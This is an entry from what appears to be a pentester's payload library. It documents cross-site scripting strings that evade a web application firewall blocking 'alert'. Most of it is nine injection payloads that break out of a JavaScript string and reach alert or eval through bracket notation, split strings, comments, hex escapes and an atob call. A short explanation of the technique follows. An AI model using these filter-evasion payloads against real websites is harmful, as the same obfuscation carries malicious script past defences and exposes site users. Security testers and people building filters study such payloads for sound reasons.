---
title: WAF Bypass via Global Object Bracket Notation and String Split
slug: waf-global-object-split
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/js-string, sink/waf-bypass]
inbound: []
---

# WAF Bypass via Global Object Bracket Notation and String Split

## Payload

```javascript
';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
```

## Variants

```javascript
';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//
';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//
';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//
```

## Context

Applies when the WAF blocks the literal string `alert` in a JS string injection context. Bracket notation avoids dot-access and the identifier string can be split, hex-escaped, or comment-interspersed so no contiguous blocked token appears. All global aliases (`window`, `self`, `this`, `top`, `parent`, `frames`, `globalThis`) are functionally equivalent — try alternatives if one alias is also blocked. The hex form `\x61\x6c\x65\x72\x74` represents `alert` and `\x65\x76\x61\x6c` represents `eval`. The base64 `atob("WFNT")` decodes to `XSS`. Sink: JS string injection inside `<script>` block or `javascript:` URI.

## Provenance

- Distilled from: `../../techniques/dom-xss/waf-bypass.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [WAF Bypass and Obfuscation](../../techniques/dom-xss/waf-bypass.md)
